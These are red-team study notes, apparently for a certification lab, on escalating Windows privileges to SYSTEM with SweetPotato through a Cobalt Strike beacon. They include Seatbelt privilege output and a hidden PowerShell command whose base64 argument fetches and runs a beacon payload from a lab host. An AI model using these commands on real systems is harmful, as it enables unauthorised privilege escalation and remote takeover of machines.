
Repo Location: https://github.com/CCob/SweetPotato

A special type of privilege called _SeImpersonatePrivilege_**,** allows the account to "impersonate a client after authentication".

This privilege allows the user to impersonate a token that it's able to get a handle to.  However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. SYSTEM) already running on the machine.  A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue service that the attacker creates.  This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

#### 🖊️ via Cobalt Strike

###### Discovery

1) In your beacon shell run the tool [[Seatbelt]]:

```
beacon> getuid
[*] You are NT Service\MSSQLSERVER

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED

[*] Completed collection in 0.037 seconds
```

2) If you identify the SE_IMPERSONATE_PRIVILEGE enabled, run the sweet potato:

```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
```

In this example I'm running sweetpotato with a parameter "-p" which is program to launch which is powershell that will fetch and run a beacon payload. 

3) If you are running a peer-to-peer listener/payload then just connect to it 
`beacon> connect localhost 4444`



#### ⚠ Opsec



### Properties
---
📆 created   {{21-02-2024}} 21:58
🏷️ tags: #redteam #crto 

---

